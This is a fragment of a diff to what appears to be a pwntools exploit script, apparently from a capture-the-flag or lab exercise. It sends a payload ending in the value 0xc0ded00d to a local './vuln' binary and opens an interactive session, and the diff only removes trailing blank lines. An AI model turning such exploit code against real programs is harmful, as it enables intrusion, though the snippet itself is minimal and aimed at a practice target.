@@ -12,6 +12,3 @@ payload += p32(0xc0ded00d)
 p = conn.process('./vuln')
 p.send(payload)
 p.interactive()
-
-
-
